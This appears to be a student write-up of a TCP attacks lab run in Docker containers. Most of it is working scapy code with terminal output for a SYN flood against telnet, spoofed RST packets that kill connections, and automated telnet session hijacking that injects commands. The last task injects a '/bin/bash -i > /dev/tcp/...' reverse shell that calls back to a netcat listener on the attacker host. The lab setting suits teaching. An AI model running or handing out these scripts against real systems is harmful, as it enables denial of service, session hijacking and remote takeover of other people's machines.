# TASKS
## TASK 1.1
For task 1 we completed the code where necessary to specifically target the telnet service on port `23`.

```py
#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')     # <-- Targeted port 23 (telnet)
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
    pkt[TCP].sport = getrandbits(16)                 # source port
    pkt[TCP].seq = getrandbits(32)                   # sequence number
    send(pkt, verbose = 0)
```

A first check on the victim machine revealed that the size of the queue was pretty big and that the cookies were disabled.

```bash
seed@VM:~/.../volumes$ docker exec -it victim-10.9.0.5 sysctl net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 256
seed@VM:~/.../volumes$ docker exec -it victim-10.9.0.5 sysctl -a | grep syncookies
net.ipv4.tcp_syncookies = 0
```

After a minute or so, we tried to view the status of the queue, however we noticed that even if the max size of the queue was set to 1024, the command show that only around 128/130 SYN_RECV requests were present inside it.

```bash
seed@VM:~/.../volumes$ docker exec -it victim-10.9.0.5 netstat -tna | grep SYN_RECV | wc -l
128
```

We were able to connect via Telnet with only one instance running of `Task1/synflood.py`, but not with at least three instances.

Also the kernel mitigation mechanism proven to be effective to allow already know connections to successfully complete.
We were able to prevent any known connection to happen only by flushing (`ip tcp_metrics flush`) the reserved queue space.

We can try reduce the queue size to `80`:
```bash
seed@VM:~/.../volumes$ docker exec victim-10.9.0.5 sysctl -w net.ipv4.tcp_max_syn_backlog=80
net.ipv4.tcp_max_syn_backlog = 80
seed@VM:~/.../volumes$ docker exec victim-10.9.0.5 ip tcp_metrics flush
```

Reducing the backlog to 80 was enough to saturate all the available spots.
Now, during the attack execution, we can see that the number of incomplete connections now is `61` and the Telnet connections now fails (stays on `Trying 10.9.0.5...`, eventually goes in timeout).

# TASK 1.2

We reset the backlog size to its original value (`256`, then flush just to be sure):
```bash
seed@VM:~/.../volumes$ docker exec victim-10.9.0.5 sysctl -w net.ipv4.tcp_max_syn_backlog=256
net.ipv4.tcp_max_syn_backlog = 256
seed@VM:~/.../volumes$ docker exec victim-10.9.0.5 ip tcp_metrics flush
```

The (proposed C file)[Task 1/synflood.c] proven to be way faster than the Python one, but we need at least two instancies running of the program to get the attack work.

Also, regarding the reserved "proven destination" queue space, we were not always able to connect through telnet even if the ip address of the source was in that queue, proving the higher efficiency of C code in this case.

# TASK 1.3

```bash
seed@VM:~/.../volumes$ docker exec -it victim-10.9.0.5  sysctl -w net.ipv4.tcp_syncookies=1
```

Enabling the SYN cookie mechanism allowed us to connect smoothly without issues through telnet even if the source IP address is not among the ones in the "proven destinations" queue and the attack is launched using either Python or C.

# TASK 2

To open a console terminal of a client (user1 in this case):

```bash
seed@VM:~/.../volumes$ docker exec -it user1-10.9.0.6 /bin/bash
root@472341f5fb4b:/# 
```

## Manual

For this attack we used Wireshark to gather the requested information.

We first authenticated ourselves on telnet and then we look at the last packet sent in the direction we want to RESET the connection (in this case from 10.9.0.6 to 10.9.0.5).

```bash
root@472341f5fb4b:/# telnet 10.9.0.5
Trying 10.9.0.5...
Connected to 10.9.0.5.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
abb6db62e897 login: seed
Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)

seed@abb6db62e897:~$
```

Tip: complete the login step to avoid incurring in a time out of the connection.

We take the [value shown in `sequence number (raw)`](Pictures/task_2/first_seqn_example.PNG) and set it as the sequence number in our script (we can do that because the last ACK hasn't any payload aka it's `=0`), together with the `R` flag.

Let's put the right IPs and ports (again, watching Wireshark).

The final program to manually spoof would look like this:

```py
#!/usr/bin/env python3

from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")

tcp = TCP(sport=58018, dport=23, flags="R", seq=4198450972)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
```

### Results

[Wireshark log](Pictures/task_2/rst_manual_sent.PNG)

Client console:
```bash
seed@abb6db62e897:~$ Connection closed by foreign host.
root@472341f5fb4b:/# 
```

## Automatic

We used this code to automate the attack. It will sniff any packet that uses the Telnet protocol and send in reply a RST packet. We can remove the last two conditions inside the `if` control to be more aggressive and flood the network.

Remember to put the right interface in `pkt = sniff(iface = X, ...)`.

```py
#!/usr/bin/env python3
from scapy.all import *

flag = 0

def sendrst(pkt):
    global flag
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].dport==23 and pkt[TCP].flags != 0x004 and flag==0:
        src_add = pkt[IP].src
        dst_add = pkt[IP].dst
        ip = IP(src=src_add, dst=dst_add)

        sp = pkt[TCP].sport
        seq_n = pkt[TCP].seq
        payload_l = len(pkt[TCP].payload)
        tot_seq = seq_n+payload_l #IMPORTANT
        tcp = TCP(sport=sp, dport=23, flags="R", seq=tot_seq, ack=0)

        pkt = ip/tcp
        print(f"Sent RST packet from {src_add}:{sp} to {dst_add}:23 with sequence number {tot_seq}")
        send(pkt,verbose=0)
        flag = 1

pkt = sniff(iface ='br-774a3b00e93c', filter ='tcp', prn=sendrst)
```

In this example we run the code after the Telnet login:
```bash
root@472341f5fb4b:/# telnet 10.9.0.5
Trying 10.9.0.5...
Connected to 10.9.0.5.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
abb6db62e897 login: seed
Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)
```

### Results

We start the script, then we can see that just after typing any digit the connection will be closed due to the received RST.

[Wireshark log](Pictures/task_2/rst_auto_sent.PNG)

Client console:
```bash
seed@abb6db62e897:~$ aConnection closed by foreign host.
root@472341f5fb4b:/# 
```

# TASK 3

## Manual

To hijack an existing connection we first sniff with Wireshark the informations needed (ports, flags, SEQ and ACK numbers).

First, we want to get the **Sequence Number**: we look for the last packet sent from the client (10.9.0.6) to the server (10.9.0.5) with flags `PSH/ACK` and get both the SEQ number and the size of the payload. 

Then we need to find the **Acknowledgment Number**: we look for the last packet in that same direction, but with flag `ACK`, and we get the ACK number.

```py
 #!/usr/bin/env python3
from scapy.all import *

data = "echo nano > /home/seed/hacked.txt \r\n"
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=58264, dport=23, flags="A", seq=757678758, ack=2218560972)

pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
```

With the provided code and the information we retrieved, we tried to hijack the active telnet session from the `seed-attacker` container.

```bash
seed@VM:~/.../volumes$ python3 session_hijacking.py
version    : BitField  (4 bits)                  = 4               (4)
ihl        : BitField  (4 bits)                  = None            (None)
tos        : XByteField                          = 0               (0)
len        : ShortField                          = None            (None)
id         : ShortField                          = 1               (1)
flags      : FlagsField  (3 bits)                = <Flag 0 ()>     (<Flag 0 ()>)
frag       : BitField  (13 bits)                 = 0               (0)
ttl        : ByteField                           = 64              (64)
proto      : ByteEnumField                       = 6               (0)
chksum     : XShortField                         = None            (None)
src        : SourceIPField                       = '10.9.0.6'      (None)
dst        : DestIPField                         = '10.9.0.5'      (None)
options    : PacketListField                     = []              ([])
--
sport      : ShortEnumField                      = 58264           (20)
dport      : ShortEnumField                      = 23              (80)
seq        : IntField                            = 757678758       (0)
ack        : IntField                            = 2218560972      (0)
dataofs    : BitField  (4 bits)                  = None            (None)
reserved   : BitField  (3 bits)                  = 0               (0)
flags      : FlagsField  (9 bits)                = <Flag 24 (PA)>  (<Flag 2 (S)>)
window     : ShortField                          = 8192            (8192)
chksum     : XShortField                         = None            (None)
urgptr     : ShortField                          = 0               (0)
options    : TCPOptionsField                     = []              (b'')
--
load       : StrField                            = b'echo hacked > /home/seed/hacked.txt\r\n' (b'')
```

We succeded and as a result we were able to execute malicious commands on the target machine.
Also the client lost the synchronization of the SEQ and ACK numbers with the server and therefore the connection was dropped.

# Automatic

Remember to change the interface. Run the code after the Telnet login to the victim.

```py
#!/usr/bin/env python3
from scapy.all import *

stop_sniffing = False


def hijack(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].dport==23:
        global stop_sniffing
        src_add = pkt[IP].src
        dst_add = pkt[IP].dst
        ip = IP(src=src_add, dst=dst_add)

        sp = pkt[TCP].sport
        seq_n = pkt[TCP].seq
        ack_n = pkt[TCP].ack
        payload_l = len(pkt[TCP].payload)
        tot_seq = seq_n+payload_l
        tcp = TCP(sport=sp, dport=23, flags="A", seq=tot_seq, ack=ack_n)
        data = "echo nano > /home/seed/autoHacked.txt \r\n"
        pkt = ip/tcp/data
        
        send(pkt,verbose=0)

        print(f"Sent ACK packet from {src_add}:{sp} to {dst_add}:23 with data={data}")

        stop_sniffing = True

def check_stop(pkt):
    global stop_sniffing

    return stop_sniffing

pkt = sniff(iface ='br-774a3b00e93c', filter ='tcp', prn=hijack, stop_filter = check_stop)
```

### Results

We can see that the command was successfully ran on the victim's system.

```bash
seed@VM:~/.../volumes$ docker exec -it victim-10.9.0.5 /bin/bash
root@abb6db62e897:/# ls /home/seed
autoHacked.txt
```

# TASK 4

For the last task we want to refer to some of the steps we used in task 3.

So we star by forging an hijacking attack but with a payload that enable us to execute a reverse shell from the server (10.9.0.5) and our attacking machine (10.9.0.1).

We gather Sequence number, payload size and Acknowledgment number and forge the packet.

```py
#!/usr/bin/env python3

from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")

tcp = TCP(sport=50144, dport=23, flags="PA", seq=1283769608, ack=3194969444)
# Command to open a reverse shell on port 9090 of host 10.9.1.0
data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
```

We open a tcp connection on our machine through the use of netcat: `netcat -lnv 9090`.

We then send the forged packet and see if the shell connects to our machine, remembering to add carriage return (`\r`) and newline (`\r`) to be sure that the command is executed on the server: `data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n"`

We did everything correctly and the reverse shell connected succesfully.
